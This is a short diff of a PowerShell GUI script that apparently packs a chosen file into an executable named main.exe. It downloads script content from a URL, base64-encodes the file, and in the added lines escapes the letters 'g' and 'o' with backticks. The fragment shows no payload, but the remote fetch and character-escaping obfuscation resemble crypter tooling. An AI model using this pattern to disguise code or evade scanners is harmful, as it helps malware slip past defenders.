@@ -146,6 +146,8 @@ $button.Add_Click({
 
         $scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
         $encodedFileContent = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePathprotect))
+        $encodedFileContent = ($encodedFileContent -replace "g", "``g")
+        $encodedFileContent = ($encodedFileContent -replace "o", "``o")
 
         $pathexe = ".\main.exe"
         $codebase64Content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path $filePathprotect -Raw)))
